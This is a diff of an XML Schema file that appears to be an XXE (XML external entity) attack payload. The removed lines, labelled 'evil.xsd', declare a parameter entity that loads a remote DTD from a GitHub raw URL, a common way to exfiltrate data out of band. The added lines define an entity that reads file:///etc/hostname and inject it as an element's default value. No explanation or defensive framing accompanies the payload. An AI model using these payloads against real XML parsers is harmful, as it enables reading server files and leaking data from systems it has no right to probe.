@@ -1,74 +1,13 @@
-<!-- evil.xsd на http://https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd/evil.xsd -->
+
+Copy
 <!DOCTYPE xs:schema [
-    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd">
-    %remote;
+    <!ENTITY file SYSTEM "file:///etc/hostname">
 ]>
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-    <xs:element name="root">
+    <xs:element name="hostnameFile">
         <xs:complexType>
             <xs:sequence>
-                <xs:element name="point">
-                    <xs:complexType>
-                        <xs:sequence>
-                            <xs:element type="xs:string" name="code"/>
-                            <xs:element type="xs:integer" name="agentCode"/>
-                            <xs:element type="xs:string" name="service"/>
-                        </xs:sequence>
-                    </xs:complexType>
-                </xs:element>
-                <xs:element name="order">
-                    <xs:complexType>
-                        <xs:sequence>
-                            <xs:element type="xs:string" name="id"/>
-                            <xs:element maxOccurs="unbounded" type="xs:string" name="promo"/>
-                            <xs:element type="xs:string" name="pickupDate">
-                                <xs:complexType>
-                                    <xs:simpleContent>
-                                        <xs:extension></xs:extension>
-                                    </xs:simpleContent>
-                                </xs:complexType>
-                            </xs:element>
-                            <xs:element type="xs:integer" name="totalPrice"/>
-                            <xs:element maxOccurs="unbounded" name="good">
-                                <xs:complexType>
-                                    <xs:sequence></xs:sequence>
-                                </xs:complexType>
-                            </xs:element>
-                        </xs:sequence>
-                    </xs:complexType>
-                </xs:element>
-                <xs:element name="personal">
-                    <xs:complexType>
-                        <xs:sequence>
-                            <xs:element type="xs:integer" name="phone"/>
-                            <xs:element type="xs:string" name="birthday">
-                                <xs:complexType>
-                                    <xs:simpleContent>
-                                        <xs:extension></xs:extension>
-                                    </xs:simpleContent>
-                                </xs:complexType>
-                            </xs:element>
-                            <xs:element type="xs:string" name="email">
-                                <xs:complexType>
-                                    <xs:simpleContent>
-                                        <xs:extension></xs:extension>
-                                    </xs:simpleContent>
-                                </xs:complexType>
-                            </xs:element>
-                            <xs:element type="xs:string" name="sex"/>
-                            <xs:element type="xs:string" name="lastName"/>
-                            <xs:element type="xs:string" name="firstName"/>
-                            <xs:element type="xs:string" name="secondName"/>
-                        </xs:sequence>
-                    </xs:complexType>
-                </xs:element>
-                <xs:element name="special">
-                    <xs:complexType>
-                        <xs:sequence>
-                            <xs:element maxOccurs="unbounded" type="xs:string" name="queryParam"/>
-                        </xs:sequence>
-                    </xs:complexType>
-                </xs:element>
+                <xs:element name="hostname" type="xs:string" default="&file;"/>
             </xs:sequence>
         </xs:complexType>
     </xs:element>
